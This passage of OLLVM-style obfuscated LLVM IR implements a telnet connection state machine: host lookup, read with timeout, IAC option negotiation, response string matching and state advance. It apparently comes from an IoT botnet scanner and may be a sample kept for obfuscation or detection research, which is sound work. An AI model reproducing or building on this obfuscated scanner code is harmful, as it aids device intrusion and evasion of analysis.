declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = load i32, i32* @x.41
  %3 = load i32, i32* @y.42
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.telstate_t*, align 8
  %11 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %10, align 8
  %12 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  %13 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %12, i32 0, i32 1
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  store i32 %14, i32* %15, align 4
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = call i8* @inet_ntoa(i32 %17) #2
  %19 = load i32, i32* @x.41
  %20 = load i32, i32* @y.42
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %18

originalBBalteredBB:                              ; preds = %originalBB, %1
  %27 = alloca %struct.telstate_t*, align 8
  %28 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %27, align 8
  %29 = load %struct.telstate_t*, %struct.telstate_t** %27, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %31, i32* %32, align 4
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  %35 = call i8* @inet_ntoa(i32 %34) #2
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %47

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* @x.43
  %29 = load i32, i32* @y.44
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %7, align 4
  %37 = load i8*, i8** %9, align 8
  %38 = call i32 @negotiate(i32 %36, i8* %37, i32 3)
  %39 = load i32, i32* @x.43
  %40 = load i32, i32* @y.44
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %5
  %48 = load i32, i32* @x.43
  %49 = load i32, i32* @y.44
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i8*, i8** %9, align 8
  %57 = load i8**, i8*** %11, align 8
  %58 = call i32 @contains_string(i8* %56, i8** %57)
  %59 = icmp ne i32 %58, 0
  %60 = load i32, i32* @x.43
  %61 = load i32, i32* @y.44
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %69

; <label>:68:                                     ; preds = %originalBBpart24
  store i32 1, i32* %6, align 4
  br label %70

; <label>:69:                                     ; preds = %originalBBpart24
  store i32 0, i32* %6, align 4
  br label %70

; <label>:70:                                     ; preds = %69, %68
  %71 = load i32, i32* %6, align 4
  ret i32 %71

originalBBalteredBB:                              ; preds = %originalBB, %27
  %72 = load i32, i32* %7, align 4
  %73 = load i8*, i8** %9, align 8
  %74 = call i32 @negotiate(i32 %72, i8* %73, i32 3)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %75 = load i8*, i8** %9, align 8
  %76 = load i8**, i8*** %11, align 8
  %77 = call i32 @contains_string(i8* %75, i8** %76)
  %78 = icmp ne i32 %77, 0
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.45
  %6 = load i32, i32* @y.46
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.__sigset_t, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.45
  %27 = load i32, i32* @y.46
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #2, !srcloc !3
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %49 = load i32, i32* %14, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.__sigset_t* %18, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %19)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %43
  store i32 0, i32* %13, align 4
  br label %83

; <label>:60:                                     ; preds = %43
  %61 = load i32, i32* @x.45
  %62 = load i32, i32* @y.46
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* %14, align 4
  %70 = load i8*, i8** %16, align 8
  %71 = load i32, i32* %17, align 4
  %72 = sext i32 %71 to i64
  %73 = call i64 @recv(i32 %69, i8* %70, i64 %72, i32 0)
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %13, align 4
  %75 = load i32, i32* @x.45
  %76 = load i32, i32* @y.46
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:83:                                     ; preds = %originalBBpart24, %59
  %84 = load i32, i32* @x.45
  %85 = load i32, i32* @y.46
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load i32, i32* %13, align 4
  %93 = load i32, i32* @x.45
  %94 = load i32, i32* @y.46
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %92

originalBBalteredBB:                              ; preds = %originalBB, %4
  %101 = alloca i32, align 4
  %102 = alloca i32, align 4
  %103 = alloca i32, align 4
  %104 = alloca i8*, align 8
  %105 = alloca i32, align 4
  %106 = alloca %struct.__sigset_t, align 8
  %107 = alloca %struct.timeval, align 8
  %108 = alloca i32, align 4
  %109 = alloca i32, align 4
  store i32 %0, i32* %102, align 4
  store i32 %1, i32* %103, align 4
  store i8* %2, i8** %104, align 8
  store i32 %3, i32* %105, align 4
  %110 = getelementptr inbounds %struct.timeval, %struct.timeval* %107, i32 0, i32 0
  store i64 0, i64* %110, align 8
  %111 = load i32, i32* %103, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.timeval, %struct.timeval* %107, i32 0, i32 1
  store i64 %112, i64* %113, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %114 = load i32, i32* %14, align 4
  %115 = load i8*, i8** %16, align 8
  %116 = load i32, i32* %17, align 4
  %117 = sext i32 %116 to i64
  %118 = call i64 @recv(i32 %114, i8* %115, i64 %117, i32 0)
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %120 = load i32, i32* %13, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.47
  %5 = load i32, i32* @y.48
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.47
  %22 = load i32, i32* @y.48
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %125 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %127

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  %31 = load i32, i32* @x.47
  %32 = load i32, i32* @y.48
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  store i8 -1, i8* %16, align 1
  %39 = load i32, i32* %13, align 4
  %40 = call i64 @send(i32 %39, i8* %16, i64 1, i32 16384)
  %41 = load i8*, i8** %14, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 1
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 252, %44
  %46 = load i32, i32* @x.47
  %47 = load i32, i32* @y.48
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %55

; <label>:54:                                     ; preds = %originalBBpart24
  store i8 -2, i8* %16, align 1
  br label %102

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i8*, i8** %14, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 1
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 254, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %55
  store i8 -4, i8* %16, align 1
  br label %101

; <label>:62:                                     ; preds = %55
  %63 = load i8*, i8** %14, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 3, %66
  br i1 %67, label %68, label %76

; <label>:68:                                     ; preds = %62
  %69 = load i8*, i8** %14, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 251, i32 253
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %16, align 1
  br label %84

; <label>:76:                                     ; preds = %62
  %77 = load i8*, i8** %14, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 252, i32 254
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %16, align 1
  br label %84

; <label>:84:                                     ; preds = %76, %68
  %85 = load i32, i32* @x.47
  %86 = load i32, i32* @y.48
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  %93 = load i32, i32* @x.47
  %94 = load i32, i32* @y.48
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %101

; <label>:101:                                    ; preds = %originalBBpart28, %61
  br label %102

; <label>:102:                                    ; preds = %101, %54
  %103 = load i32, i32* @x.47
  %104 = load i32, i32* @y.48
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %102
  %111 = load i32, i32* %13, align 4
  %112 = call i64 @send(i32 %111, i8* %16, i64 1, i32 16384)
  %113 = load i32, i32* %13, align 4
  %114 = load i8*, i8** %14, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  %116 = call i64 @send(i32 %113, i8* %115, i64 1, i32 16384)
  %117 = load i32, i32* @x.47
  %118 = load i32, i32* @y.48
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %126

; <label>:125:                                    ; preds = %originalBBpart2
  br label %126

; <label>:126:                                    ; preds = %125, %originalBBpart212
  store i32 0, i32* %12, align 4
  br label %127

; <label>:127:                                    ; preds = %126, %29
  %128 = load i32, i32* %12, align 4
  ret i32 %128

originalBBalteredBB:                              ; preds = %originalBB, %3
  %129 = alloca i32, align 4
  %130 = alloca i32, align 4
  %131 = alloca i8*, align 8
  %132 = alloca i32, align 4
  %133 = alloca i8, align 1
  store i32 %0, i32* %130, align 4
  store i8* %1, i8** %131, align 8
  store i32 %2, i32* %132, align 4
  %134 = load i8*, i8** %131, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  store i8 -1, i8* %16, align 1
  %138 = load i32, i32* %13, align 4
  %139 = call i64 @send(i32 %138, i8* %16, i64 1, i32 16384)
  %140 = load i8*, i8** %14, align 8
  %141 = getelementptr inbounds i8, i8* %140, i64 1
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 252, %143
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %102
  %145 = load i32, i32* %13, align 4
  %146 = call i64 @send(i32 %145, i8* %16, i64 1, i32 16384)
  %147 = load i32, i32* %13, align 4
  %148 = load i8*, i8** %14, align 8
  %149 = getelementptr inbounds i8, i8* %148, i64 2
  %150 = call i64 @send(i32 %147, i8* %149, i64 1, i32 16384)
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %originalBBpart2, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %33

; <label>:16:                                     ; preds = %8
  %17 = load i32, i32* @x.49
  %18 = load i32, i32* @y.50
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @x.49
  %26 = load i32, i32* @y.50
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %8

; <label>:33:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %34

; <label>:34:                                     ; preds = %65, %33
  %35 = load i32, i32* %7, align 4
  %36 = load i32, i32* %6, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %68

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %4, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8*, i8** %40, i64 %42
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %39, i8* %44)
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* @x.49
  %49 = load i32, i32* @y.50
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 1, i32* %3, align 4
  %56 = load i32, i32* @x.49
  %57 = load i32, i32* @y.50
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %85

; <label>:64:                                     ; preds = %38
  br label %65

; <label>:65:                                     ; preds = %64
  %66 = load i32, i32* %7, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %7, align 4
  br label %34

; <label>:68:                                     ; preds = %34
  %69 = load i32, i32* @x.49
  %70 = load i32, i32* @y.50
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  store i32 0, i32* %3, align 4
  %77 = load i32, i32* @x.49
  %78 = load i32, i32* @y.50
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %originalBBpart24
  %86 = load i32, i32* %3, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %16
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 1, i32* %3, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  store i32 0, i32* %3, align 4
  br label %originalBB6
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = load i32, i32* @x.51
  %4 = load i32, i32* @y.52
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.telstate_t*, align 8
  %12 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* %12, align 4
  %14 = icmp eq i32 %13, 0
  %15 = load i32, i32* @x.51
  %16 = load i32, i32* @y.52
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %44

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.51
  %25 = load i32, i32* @y.52
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = call i32 @close(i32 %34)
  %36 = load i32, i32* @x.51
  %37 = load i32, i32* @y.52
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %44

; <label>:44:                                     ; preds = %originalBBpart24, %originalBBpart2
  %45 = load i32, i32* @x.51
  %46 = load i32, i32* @y.52
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %53 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 7
  store i32 0, i32* %54, align 8
  %55 = load i32, i32* %12, align 4
  %56 = trunc i32 %55 to i8
  %57 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %57, i32 0, i32 2
  store i8 %56, i8* %58, align 8
  %59 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 9
  %61 = load i8*, i8** %60, align 8
  call void @llvm.memset.p0i8.i64(i8* %61, i8 0, i64 1024, i32 1, i1 false)
  %62 = load i32, i32* @x.51
  %63 = load i32, i32* @y.52
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %70 = alloca %struct.telstate_t*, align 8
  %71 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %70, align 8
  store i32 %1, i32* %71, align 4
  %72 = load i32, i32* %71, align 4
  %73 = icmp eq i32 %72, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %74 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
